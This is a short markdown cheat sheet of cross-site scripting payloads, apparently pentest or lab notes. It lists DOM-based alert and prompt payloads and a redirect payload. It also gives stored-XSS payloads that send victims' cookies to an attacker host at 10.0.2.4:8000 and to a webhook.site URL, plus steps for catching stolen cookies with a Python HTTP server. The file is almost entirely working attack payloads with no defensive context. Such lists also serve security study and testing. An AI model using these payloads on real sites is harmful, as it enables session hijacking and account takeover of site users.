# XSS

DOM

```bash
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>prompt(1)</script>
<img src=x onerror="prompt(1)">
<img src=x onerror="window.location.href='https://youtube.com'">
```

STORED

```bash
<h1>test</h1>
<script>alert(document.cookie)</script>
<script>document.write('<img src = http://10.0.2.4:8000/?' + document.cookie + '/>')</script>
<script>var i = new Image;i.src="https://webhook.site/dc4d042f-4f0c-4819-a03a-8ea637627c80/?"+document.cookie;</script>
```

steal cookie with python3

```bash
python3 -m http.server 8000
<script>document.location="http://10.0.2.4:8000/" + document.cookie</script>
```
